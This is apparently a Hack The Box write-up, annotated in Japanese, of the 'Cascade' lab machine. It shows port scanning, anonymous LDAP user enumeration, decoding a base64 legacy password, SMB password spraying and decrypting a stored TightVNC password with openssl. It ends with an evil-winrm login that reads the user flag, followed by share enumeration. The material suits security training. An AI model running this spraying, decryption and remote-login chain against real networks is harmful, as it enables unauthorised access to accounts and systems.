https://app.hackthebox.com/machines/235

## STEP 1
```sh
└─$ rustscan -a 10.129.188.71 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.188.71:53
Open 10.129.188.71:88
Open 10.129.188.71:135
Open 10.129.188.71:139
Open 10.129.188.71:389
Open 10.129.188.71:445
Open 10.129.188.71:636
Open 10.129.188.71:3268
Open 10.129.188.71:3269
Open 10.129.188.71:5985
Open 10.129.188.71:49154
Open 10.129.188.71:49155
Open 10.129.188.71:49158
Open 10.129.188.71:49157
Open 10.129.188.71:49163
10.129.188.71 -> [53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49158,49157,49163]
```


## STEP 2
匿名でldap経由で有効ユーザを列挙できた
```sh
└─$ netexec ldap 10.129.188.71 -u '' -p '' --active-users               
LDAP        10.129.188.71   389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
LDAP        10.129.188.71   389    CASC-DC1         [+] cascade.local\: 
LDAP        10.129.188.71   389    CASC-DC1         [*] Total records returned: 15, total 4 user(s) disabled
LDAP        10.129.188.71   389    CASC-DC1         -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.188.71   389    CASC-DC1         arksvc                        2020-01-09 11:18:20 0        
LDAP        10.129.188.71   389    CASC-DC1         s.smith                       2020-01-28 14:58:05 0        
LDAP        10.129.188.71   389    CASC-DC1         r.thompson                    2020-01-09 14:31:26 0        
LDAP        10.129.188.71   389    CASC-DC1         util                          2020-01-12 21:07:11 0        
LDAP        10.129.188.71   389    CASC-DC1         j.wakefield                   2020-01-09 15:34:44 0        
LDAP        10.129.188.71   389    CASC-DC1         s.hickson                     2020-01-12 20:24:27 0        
LDAP        10.129.188.71   389    CASC-DC1         j.goodhand                    2020-01-12 20:40:26 0        
LDAP        10.129.188.71   389    CASC-DC1         a.turnbull                    2020-01-12 20:43:13 0        
LDAP        10.129.188.71   389    CASC-DC1         d.burman                      2020-01-13 11:36:12 0        
LDAP        10.129.188.71   389    CASC-DC1         BackupSvc                     2020-01-13 11:37:03 0        
LDAP        10.129.188.71   389    CASC-DC1         j.allen                       2020-01-13 12:23:59 0
```
godapでldapを眺めていると謎の属性「cascadeLegacyPwd」を発見  
もしやパスワードか  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Cascade_01.png">  
パスワードスプレーをしたが、ログインできず
```sh
└─$ netexec smb 10.129.188.71 -u user.txt  -p 'Clk0bjVldmE=' --continue-on-success
SMB         10.129.188.71   445    NONE             [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.188.71   445    NONE             [-] cascade.local\arksvc:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\s.smith:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\r.thompson:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\util:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\j.wakefield:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\s.hickson:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\j.goodhand:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\a.turnbull:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\d.burman:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\BackupSvc:Clk0bjVldmE= STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\j.allen:Clk0bjVldmE= STATUS_LOGON_FAILURE
```
しかしパスワードはbase64でエンコードされているっぽい  
デコードした文字列でパスワードスプレー実施、r.thompsonのログイン成功を確認！
```sh
└─$ echo 'Clk0bjVldmE=' | base64 -d

Y4n5eva

└─$ netexec smb 10.129.188.71 -u user.txt  -p 'rY4n5eva' --continue-on-success 
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\util:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\j.wakefield:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\s.hickson:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\j.goodhand:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\a.turnbull:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\d.burman:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\BackupSvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\j.allen:rY4n5eva STATUS_LOGON_FAILURE 
```
5985番が開いていたのでwinrmが使用できるが、r.thompsonはwinrmログイン可能グループに所属してない  
そのため、水平権限昇格をさがす
```sh
└─$ netexec ldap 10.129.188.71 -u '' -p '' --groups 'Remote Management Users'
LDAP        10.129.188.71   389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
LDAP        10.129.188.71   389    CASC-DC1         [+] cascade.local\: 
LDAP        10.129.188.71   389    CASC-DC1         Steve Smith
LDAP        10.129.188.71   389    CASC-DC1         ArkSvc
```


## STEP 3
smb列挙
```sh
└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva -M spider_plus 
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.188.71   445    CASC-DC1         [*] Enumerated shares
SMB         10.129.188.71   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.188.71   445    CASC-DC1         -----           -----------     ------
SMB         10.129.188.71   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.188.71   445    CASC-DC1         Audit$                          
SMB         10.129.188.71   445    CASC-DC1         C$                              Default share
SMB         10.129.188.71   445    CASC-DC1         Data            READ            
SMB         10.129.188.71   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.188.71   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.188.71   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.188.71   445    CASC-DC1         SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.188.71.json".
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Shares:           8 (ADMIN$, Audit$, C$, Data, IPC$, NETLOGON, print$, SYSVOL)
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Readable Shares:  4 (Data, NETLOGON, print$, SYSVOL)
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Total folders found:  58
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] Total files found:    20
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size average:    1.07 KB
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size min:        6 B
SPIDER_PLUS 10.129.188.71   445    CASC-DC1         [*] File size max:        5.83 KB
                
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.188.71.json 
{
    "Data": {
        "IT/Email Archives/Meeting_Notes_June_2018.html": {
            "atime_epoch": "2020-01-15 20:08:46",
            "ctime_epoch": "2020-01-15 20:08:46",
            "mtime_epoch": "2020-01-28 13:00:30",
            "size": "2.46 KB"
        },
        "IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log": {
            "atime_epoch": "2020-01-10 11:19:20",
            "ctime_epoch": "2020-01-10 11:19:20",
            "mtime_epoch": "2020-01-28 20:19:11",
            "size": "1.27 KB"
        },
        "IT/Logs/DCs/dcdiag.log": {
            "atime_epoch": "2020-01-10 11:17:30",
            "ctime_epoch": "2020-01-10 11:17:30",
            "mtime_epoch": "2020-01-26 17:22:05",
            "size": "5.83 KB"
        },
        "IT/Temp/s.smith/VNC Install.reg": {
            "atime_epoch": "2020-01-28 14:27:43",
            "ctime_epoch": "2020-01-28 14:27:43",
            "mtime_epoch": "2020-01-28 15:00:01",
            "size": "2.62 KB"
        }
    },
    "NETLOGON": {
        "MapAuditDrive.vbs": {
            "atime_epoch": "2020-01-15 16:45:08",
            "ctime_epoch": "2020-01-15 16:45:08",
            "mtime_epoch": "2020-01-15 16:50:14",
            "size": "258 B"
        },
        "MapDataDrive.vbs": {
            "atime_epoch": "2020-01-15 16:50:28",
            "ctime_epoch": "2020-01-15 16:49:19",
            "mtime_epoch": "2020-01-15 16:51:03",
            "size": "255 B"
        }
    },
    "SYSVOL": {
        "cascade.local/Policies/{2906D621-7B58-40F1-AA47-4ED2AEF29484}/GPT.INI": {
            "atime_epoch": "2020-01-09 13:12:59",
            "ctime_epoch": "2020-01-09 13:12:59",
            "mtime_epoch": "2020-01-09 13:13:00",
            "size": "59 B"
        },
        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-09 10:31:40",
            "ctime_epoch": "2020-01-09 10:31:40",
            "mtime_epoch": "2020-03-23 04:33:59",
            "size": "23 B"
        },
        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-09 10:31:40",
            "ctime_epoch": "2020-01-09 10:31:40",
            "mtime_epoch": "2020-03-23 04:33:59",
            "size": "1.22 KB"
        },
        "cascade.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2020-01-09 10:48:03",
            "ctime_epoch": "2020-01-09 10:48:03",
            "mtime_epoch": "2020-01-09 10:48:03",
            "size": "2.72 KB"
        },
        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/GPO.cmt": {
            "atime_epoch": "2020-01-09 13:29:34",
            "ctime_epoch": "2020-01-09 13:29:34",
            "mtime_epoch": "2020-01-09 13:30:29",
            "size": "24 B"
        },
        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/GPT.INI": {
            "atime_epoch": "2020-01-09 10:50:16",
            "ctime_epoch": "2020-01-09 10:50:16",
            "mtime_epoch": "2020-01-28 17:07:51",
            "size": "64 B"
        },
        "cascade.local/Policies/{322FEA29-156D-4476-8A06-1935A3525C1C}/User/Scripts/scripts.ini": {
            "atime_epoch": "2020-01-09 14:52:44",
            "ctime_epoch": "2020-01-09 14:52:44",
            "mtime_epoch": "2020-01-28 17:07:51",
            "size": "6 B"
        },
        "cascade.local/Policies/{4026EDF8-DBDA-4AED-8266-5A04B80D9327}/GPT.INI": {
            "atime_epoch": "2020-01-09 14:42:31",
            "ctime_epoch": "2020-01-09 14:42:31",
            "mtime_epoch": "2020-01-09 14:42:31",
            "size": "59 B"
        },
        "cascade.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-09 10:31:40",
            "ctime_epoch": "2020-01-09 10:31:40",
            "mtime_epoch": "2020-01-26 12:12:15",
            "size": "23 B"
        },
        "cascade.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-09 10:31:40",
            "ctime_epoch": "2020-01-09 10:31:40",
            "mtime_epoch": "2020-01-26 12:12:15",
            "size": "3.99 KB"
        },
        "cascade.local/Policies/{820E48A7-D083-4C2D-B5F8-B24462924714}/GPT.INI": {
            "atime_epoch": "2020-01-09 13:33:51",
            "ctime_epoch": "2020-01-09 13:33:51",
            "mtime_epoch": "2020-01-09 13:34:03",
            "size": "59 B"
        },
        "cascade.local/Policies/{D67C2AD5-44C7-4468-BA4C-199E75B2F295}/GPT.INI": {
            "atime_epoch": "2020-01-09 14:42:40",
            "ctime_epoch": "2020-01-09 14:42:40",
            "mtime_epoch": "2020-01-09 14:42:40",
            "size": "59 B"
        },
        "cascade.local/scripts/MapAuditDrive.vbs": {
            "atime_epoch": "2020-01-15 16:45:08",
            "ctime_epoch": "2020-01-15 16:45:08",
            "mtime_epoch": "2020-01-15 16:50:14",
            "size": "258 B"
        },
        "cascade.local/scripts/MapDataDrive.vbs": {
            "atime_epoch": "2020-01-15 16:50:28",
            "ctime_epoch": "2020-01-15 16:49:19",
            "mtime_epoch": "2020-01-15 16:51:03",
            "size": "255 B"
        }
    }
}
```
レジストリがあったのでダウンロード
```sh
└─$ netexec smb 10.129.188.71 -u r.thompson -p rY4n5eva --share Data --get-file 'IT/Temp/s.smith/VNC Install.reg' '/home/kali/htb/vnc.reg'
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.188.71   445    CASC-DC1         [*] Copying "IT/Temp/s.smith/VNC Install.reg" to "/home/kali/htb/vnc.reg"
SMB         10.129.188.71   445    CASC-DC1         [+] File "IT/Temp/s.smith/VNC Install.reg" was downloaded to "/home/kali/htb/vnc.reg"
```
ファイル名およびレジストリパス名から、vncの設定っぽい
```sh
└─$ cat vnc.reg                                                   
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```
パスワードのようなものを発見  
hexだが、asciiに変換すると文字化けするので暗号化で保護されているっぽい
```sh
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```
decryptできるかググってみると、[リンク](https://github.com/frizb/PasswordDecrypts)を発見  
リンクどおりのコマンド実行、復号できた
```sh
└─$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv 
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```
パスワードスプレー実施、s.smithでログイン成功！
```sh
└─$ netexec smb 10.129.188.71 -u user.txt -p sT333ve2 --continue-on-success
SMB         10.129.188.71   445    NONE             [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.188.71   445    NONE             [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [+] cascade.local\s.smith:sT333ve2 
SMB         10.129.188.71   445    NONE             [-] cascade.local\r.thompson:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\util:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\j.wakefield:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\s.hickson:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\j.goodhand:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\a.turnbull:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\d.burman:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\BackupSvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    NONE             [-] cascade.local\j.allen:sT333ve2 STATUS_LOGON_FAILURE
```
step2でも確認したとおり、s.smithは「Remote Management Users」のメンバーであったためwinrmでログイン成功！  
ユーザフラグゲット
```sh
└─$ evil-winrm -i 10.129.188.71 -u s.smith -p sT333ve2
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> cat ..\Desktop\user.txt
3ada386a71ef4ab7b28e28765da00829
```


## STEP 4
```sh
└─$ smbclient -U 'cascade.local/s.smith%sT333ve2' -c 'recurse ON; dir' //10.129.195.221/Audit$
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

\DB
  .                                   D        0  Tue Jan 28 16:40:59 2020
  ..                                  D        0  Tue Jan 28 16:40:59 2020
  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020

\x64
  .                                   D        0  Sun Jan 26 17:25:27 2020
  ..                                  D        0  Sun Jan 26 17:25:27 2020
  SQLite.Interop.dll                  A  1639936  Sun Oct 27 02:39:20 2019

\x86
  .                                   D        0  Sun Jan 26 17:25:27 2020
  ..                                  D        0  Sun Jan 26 17:25:27 2020
  SQLite.Interop.dll                  A  1246720  Sun Oct 27 02:34:20 2019

                6553343 blocks of size 4096. 1664656 blocks available
```
```sh
└─$ netexec smb 10.129.195.221 -u s.smith -p sT333ve2 --share Audit$ --get-file 'RunAudit.bat' '/home/kali/RunAudit.bat'
SMB         10.129.195.221  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
SMB         10.129.195.221  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.129.195.221  445    CASC-DC1         [*] Copying "RunAudit.bat" to "/home/kali/RunAudit.bat"
SMB         10.129.195.221  445    CASC-DC1         [+] File "RunAudit.bat" was downloaded to "/home/kali/RunAudit.bat"
                                                                                                                                                                                
└─$ cat ../RunAudit.bat                                            
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```
```sh
*Evil-WinRM* PS C:\Users\s.smith\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares"

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares
    print$    REG_MULTI_SZ    CSCFlags=768\0MaxUses=4294967295\0Path=C:\Windows\system32\spool\drivers\0Permissions=0\0Remark=Printer Drivers\0ShareName=print$\0Type=0
    SYSVOL    REG_MULTI_SZ    CSCFlags=4352\0MaxUses=4294967295\0Path=C:\Windows\SYSVOL\sysvol\0Permissions=0\0Remark=Logon server share \0ShareName=SYSVOL\0Type=0
    NETLOGON    REG_MULTI_SZ    CSCFlags=4352\0MaxUses=4294967295\0Path=C:\Windows\SYSVOL\sysvol\cascade.local\SCRIPTS\0Permissions=0\0Remark=Logon server share \0ShareName=NETLOGON\0Type=0
    Data    REG_MULTI_SZ    CSCFlags=0\0MaxUses=4294967295\0Path=C:\Shares\Data\0Permissions=9\0ShareName=Data\0Type=0
    Audit$    REG_MULTI_SZ    CSCFlags=0\0MaxUses=4294967295\0Path=C:\Shares\Audit\0Permissions=9\0ShareName=Audit$\0Type=0

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares\Security
```
